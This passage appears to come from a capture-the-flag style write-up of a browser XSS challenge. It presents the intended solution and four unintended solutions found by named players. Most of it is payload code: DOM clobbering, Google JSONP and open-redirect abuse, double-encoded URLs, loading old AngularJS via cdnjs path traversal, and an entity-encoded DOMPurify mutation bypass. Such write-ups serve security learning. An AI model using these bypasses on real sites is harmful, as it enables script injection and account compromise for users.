+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>scripts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>undefined<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com/recaptcha/../complete/search?client=chrome&amp;q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%252fangular.js/1.8.2/angular.js%23&amp;callback=loadScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultOptions</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>allowDOM</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g-recaptcha<span class="token punctuation">"</span></span> <span class="token attr-name">data-sitekey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>AAA<span class="token punctuation">"</span></span> <span class="token attr-name">data-error-callback</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reloadRecaptchaScript<span class="token punctuation">"</span></span> <span class="token attr-name">data-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>invisible<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g-recaptcha<span class="token punctuation">"</span></span> <span class="token attr-name">data-sitekey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>B<span class="token punctuation">"</span></span> <span class="token attr-name">data-error-callback</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loadData<span class="token punctuation">"</span></span> <span class="token attr-name">data-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>invisible<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">data-ng-app</span> <span class="token attr-name">data-ng-csp</span><span class="token punctuation">></span></span>
+    [["abc".encode.call().alert("abc".encode.call().document.domain)]]
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Note: somehow hexo throw error if I used <code>&#125;&#123;</code>, so I changed to <code>[[]]</code></p>
+<h2><span id="unintended">Unintended</span></h2><p>Besides the intended solution, there are 4 amazing unintended solutions.</p>
+<h3><span id="unintended-1-by-maple3142">Unintended #1 by @maple3142</span></h3><p>At first, I didn’t know there was a <code>jsonp</code> argument in <code>https://www.google.com/complete/search</code> endpoint, so there was no check for <code>jsonp</code>.</p>
+<p>It’s east to get a XSS by loading something like <code>https://www.google.com/complete/search?client=chrome&amp;q=123&amp;jsonp=alert(document.domain)//</code></p>
+<p>Later on, I implemented a <a target="_blank" rel="noopener" href="https://github.com/aszx87410/xss-challenge/commit/26322b72a3c45aa1751d46253455a64d94d051d8">check</a> for <code>jsonp</code> in <code>reloadRecaptchaScript</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'jsonp'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'jsonp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'dangerous keyword detected'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3><span id="unintended-2-by-smaury92">Unintended #2 by @smaury92</span></h3><p>It turns out that I implemented a flawed check, can you spot the bug?</p>
+<p>You can bypass the check by open redirect and double encoded the <code>https://google.com/complete/search</code> call, like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">reloadRecaptchaScript</span><span class="token punctuation">(</span><span class="token string">'https://www.google.com/recaptcha/../url?q=https://www.google.com/complete/search?client=chrome%26q=%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%37%25%37%37%25%37%37%25%32%65%25%36%37%25%36%66%25%36%66%25%36%37%25%36%63%25%36%35%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%36%33%25%36%66%25%36%64%25%37%30%25%36%63%25%36%35%25%37%34%25%36%35%25%32%66%25%37%33%25%36%35%25%36%31%25%37%32%25%36%33%25%36%38%25%33%66%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%33%64%25%36%33%25%36%38%25%37%32%25%36%66%25%36%64%25%36%35%25%32%36%25%36%61%25%37%33%25%36%66%25%36%65%25%37%30%25%33%64%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%36%34%25%36%66%25%36%64%25%36%31%25%36%39%25%36%65%25%32%39%25%32%66%25%32%66%2523%26callback=loadScript%231'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>So it passed the check for <code>reloadRecaptchaScript</code>.</p>
+<p>I decided the move the check from <code>reloadRecaptchaScript</code> to <code>loadScript</code>: <a target="_blank" rel="noopener" href="https://github.com/aszx87410/xss-challenge/commit/7382e9b48721b1dd9edcd21675e1e7f56d171c2c">https://github.com/aszx87410/xss-challenge/commit/7382e9b48721b1dd9edcd21675e1e7f56d171c2c</a></p>
+<h3><span id="unintended-3-by-lbrnli1234">Unintended #3 by @lbrnli1234</span></h3><p>The check failed again.</p>
+<p>payload:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">reloadRecaptchaScript</span><span class="token punctuation">(</span><span class="token string">'https://www.google.com/recaptcha/../url?q=https%3A%2F%2Fwww.google.com%2Fcomplete%2Fsearch%3Fclient%3Dhp%26q%3Da%26%256asonp%3Dalert(document.domain)'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>I was aware of google open redirect but I didn’t notice a subtle difference. When I tried google open redirect, it returned 200 in that case and used client side redirect: <a target="_blank" rel="noopener" href="https://www.google.com/url?q=https://tech-blog.cymetrics.io&sa=D&sntz=1&usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug">https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug</a></p>
+<p>So I thought it was impossible to leverage this open redirect.</p>
+<p>But for some other cases, it returns 302: <a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&url=http://example.org/&usg=AOvVaw1YigBkNF7L7D2x2Fl532mA">https://www.google.com/url?sa=t&amp;url=http://example.org/&amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA</a></p>
+<p>Anyway, I didn’t fix this unintended in the end because I don’t have a good solution at the moment.</p>
+<h3><span id="unintended-4-by-lbrnli1234">Unintended #4 by @lbrnli1234</span></h3><p>Another dope unintended has been found:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>aszx87410<span class="token punctuation">.</span>github<span class="token punctuation">.</span>io<span class="token operator">/</span>xss<span class="token operator">-</span>challenge<span class="token operator">/</span>notes<span class="token operator">/</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token operator">&amp;</span>content<span class="token operator">=</span><span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span>g<span class="token operator">-</span>recaptcha data<span class="token operator">-</span>sitekey<span class="token operator">=</span>x data<span class="token operator">-</span>error<span class="token operator">-</span>callback<span class="token operator">=</span>reloadRecaptchaScript<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span>g<span class="token operator">-</span>recaptcha data<span class="token operator">-</span>sitekey<span class="token operator">=</span>x data<span class="token operator">-</span>error<span class="token operator">-</span>callback<span class="token operator">=</span>reloadRecaptchaScript<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span>g<span class="token operator">-</span>recaptcha data<span class="token operator">-</span>sitekey<span class="token operator">=</span>x data<span class="token operator">-</span>error<span class="token operator">-</span>callback<span class="token operator">=</span>loadData<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+<span class="token operator">&lt;</span>form<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
+<span class="token operator">&lt;</span>form id<span class="token operator">=</span>defaultOptions<span class="token operator">></span><span class="token operator">&lt;</span>img id<span class="token operator">=</span>allowDOM<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
+<span class="token operator">&lt;</span>form name<span class="token operator">=</span>scripts<span class="token operator">></span>
+<span class="token operator">&lt;</span>input id<span class="token operator">=</span><span class="token keyword">undefined</span> src<span class="token operator">=</span><span class="token string">'https://www.google.com/recaptcha/../complete/search?client=hp&amp;q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.0/purify.min.js%23&amp;callback=loadScript'</span><span class="token operator">></span>
+<span class="token operator">&lt;</span>img id<span class="token operator">=</span><span class="token keyword">undefined</span> src<span class="token operator">=</span><span class="token string">'https://www.google.com/recaptcha/../jsapi?callback=loadData'</span><span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
+<span class="token operator">&lt;</span>form<span class="token operator">></span><span class="token operator">&lt;</span>math<span class="token operator">></span><span class="token operator">&lt;</span>mtext<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span><span class="token operator">&lt;</span>form<span class="token operator">></span><span class="token operator">&lt;</span>mglyph<span class="token operator">></span><span class="token operator">&lt;</span>style<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>math<span class="token operator">></span><span class="token operator">&lt;</span>iframe srcdoc<span class="token operator">=</span>'
+<span class="token operator">&amp;</span>#x3c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x20<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x68<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x66<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x78<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x62<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x66<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x79<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x25<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x32<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x66<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x79<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x31<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x37<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x32<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x79<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#xa<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x20<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x68<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x66<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x78<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x62<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x66<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x79<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x25<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x32<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x66<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x67<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x31<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x30<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x31<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x67<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x22<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#xa<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x20<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x67<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x20<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x67<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2d<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x7b<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x7b<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x24<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x79<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x24<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x75<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x79<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x2e<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x64<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6f<span class="token 